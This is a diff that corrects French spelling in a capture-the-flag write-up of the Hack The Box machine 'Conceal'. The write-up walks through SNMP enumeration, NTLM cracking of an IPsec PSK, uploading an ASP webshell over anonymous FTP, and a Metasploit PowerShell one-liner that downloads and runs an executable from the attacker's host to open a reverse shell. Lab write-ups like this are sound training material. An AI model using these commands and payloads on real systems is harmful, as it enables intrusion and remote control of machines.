@@ -11,12 +11,12 @@ Résumé : <br />
 
 La boîte Conceal était une boîte assez intéressante et très amusante, le niveau était assez simple, juste une bonne énumération était amplement suffisante. Et j'ai beaucoup appris de chose dans cette fameuse boîte. <br />
 
-- Il y'a le port SNMP qui est ouvert, et il a été mis en public concrètement, et nous trouvons une adresse PSK. <br />
+- Il y a le port SNMP qui est ouvert, et il a été mis en public concrètement, et nous trouvons une adresse PSK. <br />
 - Et ensuite nous devons cracker l'adresse PSK. <br />
 - Une bonne configuration pour avoir accès, avec le protocole IPSEC avec le programme StrongSwan. <br />
-- Nous devons créer un point de routage avec IPSEC pour redirigé les ports et d'accéder à la machine. <br />
+- Nous devons créer un point de routage avec IPSEC pour rediriger les ports et d'accéder à la machine. <br />
 - On peut upload des fichiers dans le FTP, et ensuite d'exécuter le script dans la page web et faire son reverse shell. <br />
-- Pour l'accès root, il y'a une vulnérabilité windows assez récent, la faille ALPC.
+- Pour l'accès root, il y a une vulnérabilité Windows assez récente, la faille ALPC.
 
 Source : <br />
 
@@ -25,7 +25,7 @@ Source : <br />
 
 Nmap Scan
 ----
-Donc il y'a aucun port ouvert visiblement donc allons voir pour le UDP et de chercher des ports qui peuvent être très intéréssant pour l'énumération.
+Donc il y a aucun port ouvert visiblement donc va voir pour l'UDP et de chercher des ports qui peuvent être très intéressant pour l'énumération.
 
     root@Seyptoo:~/htb/box/Conceal# nmap -sC -sV -oA nmap/check 10.10.10.116
 
@@ -47,7 +47,7 @@ Pour le UDP je vais utiliser le programme 'masscan'.
     Scanning 1 hosts [131070 ports/host]
     Discovered open port 161/udp on 10.10.10.116                                   
 
-Donc comme vous pouvez le voir il y'a le port 161/udp qui est ouvert nous cela correspond au protocole SNMP, donc essayons d'énumérer ça avec nmap et de voir les informations nécéssaires.
+Donc comme vous pouvez le voir il y a le port 161/UDP qui est ouvert nous cela correspond au protocole SNMP, donc essayons d'énumérer ça avec Nmap et de voir les informations nécessaires.
 
     root@Seyptoo:~/htb/box/Conceal# nmap -sU -sC -sV -p161 10.10.10.116
 
@@ -68,7 +68,7 @@ Donc nous allons essayer d'exécuter le programme snmpwalk et d'énumérer le se
     iso.3.6.1.2.1.1.5.0 = STRING: "Conceal"
     [...SNIP...]
     
-Comme vous pouvez le voir il y'a une adresse PSK, cette adresse va nous permettre beaucoup de chose, tout d'abord essayons de cracker le hash donc le hash est du NTLM. Donc j'ai créer un script en Python pour cracker le hash en question.
+Comme vous pouvez le voir il y a une adresse PSK, cette adresse va nous permettre beaucoup de choses, tout d'abord essayons de cracker le hash, donc le hash est du NTLM. Donc j'ai créé un script en Python pour cracker le hash en question.
 
     #coding:utf-8
 
@@ -147,7 +147,7 @@ Comme vous pouvez le voir il y'a une adresse PSK, cette adresse va nous permettr
 		NTLM().start()
 
 
-Donc le programme ressemble à ça concrètement vous avez juste à l'exécuter et le programme va cracker le hash, si vous souhaitez bruteforce le mot de passe ça va prendre un bon moment. Je vous conseille d'allez sur CrackStation.
+Donc le programme ressemble à ça concrètement vous avez juste à l'exécuter et le programme va cracker le hash, si vous souhaitez bruteforce le mot de passe ça va prendre un bon moment. Je vous conseille d'aller sur CrackStation.
 
 	root@Seyptoo:~/htb/box/Conceal# python NTLM.py /usr/share/wordlist/rockyou.txt 9C8B1A372B1878851BE2C097031B6E43
 	[-] ERROR NTLM/1000 : 9c8b1a372b1878851be2c097031b6e43:azerty
@@ -155,13 +155,13 @@ Donc le programme ressemble à ça concrètement vous avez juste à l'exécuter 
 
 	[+] NTLM : 9c8b1a372b1878851be2c097031b6e43:Dudecake1!
 
-Après un bon moment de bruteforce, il a enfin trouvé le mot de passe, mais je ne recommande pas d'utiliser le programme ça va prendre enormément de temps. Allez plutôt sur CrackStation.
+Après un bon moment de bruteforce, il a enfin trouvé le mot de passe, mais je ne recommande pas d'utiliser le programme ça va prendre énormément de temps. Allez plutôt sur CrackStation.
 
 [![forthebadge made-with-python](https://image.noelshack.com/fichiers/2019/20/5/1558118186-capture-du-2019-05-17-20-36-09.png)](https://image.noelshack.com/fichiers/2019/20/5/1558118186-capture-du-2019-05-17-20-36-09.png)
 
 IPSEC Configuration
 ----
-Donc nous arrivons dans la partie la plus intéréssante de la machine car c'est un moment ou j'ai pris enormément de temps mais également de souffrance, j'ai pris vraiment beaucoup de temps. <br />
+Donc nous arrivons dans la partie la plus intéressante de la machine car c'est un moment où j'ai pris énormément de temps mais également de souffrance, j'ai pris vraiment beaucoup de temps. <br />
 
 IPsec (Internet Protocol Security), défini par l'IETF comme un cadre de standards ouverts pour assurer des communications privées et protégées sur des réseaux IP, par l'utilisation des services de sécurité cryptographiques, est un ensemble de protocoles utilisant des algorithmes permettant le transport de données sécurisées sur un réseau IP. <br />
 
@@ -190,14 +190,14 @@ Fichier : ipsec.conf
 	    fragmentation=yes
 	    keyingtries=1
 
-N'oubliez surtout pas de modifier l'adresse IP de l'interface tun0 dans le leftsubnet et dans le left, pour que il y'a aucun problème au niveau de l'exécution. <br /><br />
+N'oubliez surtout pas de modifier l'adresse IP de l'interface tun0 dans le leftsubnet et dans le left, pour que il y a aucun problème au niveau de l'exécution. <br /><br />
 Fichier : ipsec.secrets
 
 	# ipsec.secrets - strongSwan IPsec secrets file
 
 	%any %any : PSK "Dudecake1!"
 
-Je vais pas vous expliquez en détail le fonctionnement des lignes, car sinon ça va être très très long. Il y'a déjà la documentation qui nous montre le fonctionnement. Donc pour lancer la configuration et de tester si la connexion marche avec succès lancer la commande juste ci-dessous.
+Je ne vais pas vous expliquer en détail le fonctionnement des lignes, car sinon ça va être très très long. Il y a déjà la documentation qui nous montre le fonctionnement. Donc pour lancer la configuration et de tester si la connexion marche avec succès lancée la commande juste ci-dessous.
 
 	root@Seyptoo:~/htb/box/Conceal# ipsec up conceal
 	generating QUICK_MODE request 3539874152 [ HASH SA No ID ID ]
@@ -209,11 +209,11 @@ Je vais pas vous expliquez en détail le fonctionnement des lignes, car sinon ç
 	CHILD_SA conceal{2} established with SPIs c8dc7342_i dde379e8_o and TS 10.10.15.229/32 === 10.10.10.116/32[tcp]
 	connection 'conceal' established successfully
 
-La connexion a été established avec succès donc c'est parfait donc maintenant crée un point de routage, nous allons redirigé les ports vers notre réseau pour accéder au port filtrés de la machine, je vous ai fais un petit schéma ci-dessous pour que vous compreniez le système.
+La connexion a été established avec succès donc c'est parfait donc maintenant nous allons créés un point de routage, nous allons rediriger les ports vers notre réseau pour accéder aux ports filtrés de la machine, je vous ai faits un petit schéma ci-dessous pour que vous compreniez le système.
 
 [![forthebadge made-with-python](https://image.noelshack.com/fichiers/2019/20/6/1558172167-capture-du-2019-05-17-12-18-09.png)](https://image.noelshack.com/fichiers/2019/20/6/1558172167-capture-du-2019-05-17-12-18-09.png)
 
-Donc pour rédirigé les ports filtrés vers notre machine vous devez simplement tapé la commande ci-dessous et vous allez voir que la redirection se fais très simplement.
+Donc pour rediriger les ports filtrés vers notre machine vous devez simplement taper la commande ci-dessous et vous allez voir que la redirection se fait très simplement.
 
 	root@Seyptoo:~/htb/box/Conceal# ipsec route conceal
 	'conceal' routed
@@ -264,7 +264,7 @@ Donc si on refait un scan de port TCP nous allons voir que il y'a des service ou
 	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                         
 	Nmap done: 1 IP address (1 host up) scanned in 23.56 seconds
 
-Nous avons des informations très intéréssantes, on peut voir que on peut se connecter en tant que Anonymous dans le FTP et on peut également upload des fichiers.
+Nous avons des informations très intéressantes, on peut voir qu'on peut se connecter en tant que Anonymous dans le FTP et on peut également upload des fichiers.
 	
 HTTP
 ----
@@ -273,7 +273,7 @@ Donc si nous allons dans le serveur HTTP, il y'a pas grand chose donc pour ça j
 	root@Seyptoo:~/htb/box/Conceal# gobuster -q -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.116
 	/upload (Status: 301)
 
-Donc le site web accepte seulement du asp ou bien du aspx, mais il accepte en aucun cas du PHP. Donc pour ça je vais upload un shell ASP WebShell pour IIS 8 dans le serveur pour effectué des commandes. Un bon lien pour télécharger le shell. https://packetstormsecurity.com/files/137024/ASP-Webshell-For-IIS-8.html <br />
+Donc le site web accepte seulement de l'asp ou bien du aspx, mais il accepte en aucun cas du PHP. Donc pour ça je vais upload un shell ASP WebShell pour IIS 8 dans le serveur pour envoyer des commandes. Un bon lien pour télécharger le shell. https://packetstormsecurity.com/files/137024/ASP-Webshell-For-IIS-8.html <br />
 
 	root@Seyptoo:~/htb/box/Conceal# ftp 10.10.10.116
 	Connected to 10.10.10.116.
@@ -306,11 +306,11 @@ Parfait nous sommes prêt pour le reverse shell nous allons utiliser metasploit 
 	msf exploit(multi/script/web_delivery) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
 	msf exploit(multi/script/web_delivery) > set TARGET 4
 	
-Donc le code fournis en powershell il faut le mettre depuis le site web et non depuis curl car il y'a des problèmes d'encode etc.. donc je vous conseille vivement d'aller sur le chemin directement. Le code fournis par metasploit.
+Donc le code fournis en powershell il faut le mettre depuis le site web et non depuis curl car il y a des problèmes d'encodage etc.. Donc je vous conseille vivement d'aller sur le chemin directement. Le code fourni par Metasploit.
 
 	powershell.exe -nop -w hidden -c $z="echo ($env:temp+'\DF95KsPU.exe')"; (new-object System.Net.WebClient).DownloadFile('http://10.10.15.229:8080/mSErF4WvPeAoECb', $z); invoke-item $z
 	
-Après avoir exécuter le code powershell nous avons un shell, mais le problème nous sommes pas administrator.
+Après avoir exécuté le code powershell nous avons un shell, mais le problème nous sommes pas administrator.
 
 	msf exploit(multi/script/web_delivery) > exploit
 	[*] 10.10.10.116     web_delivery - Delivering Payload                                                
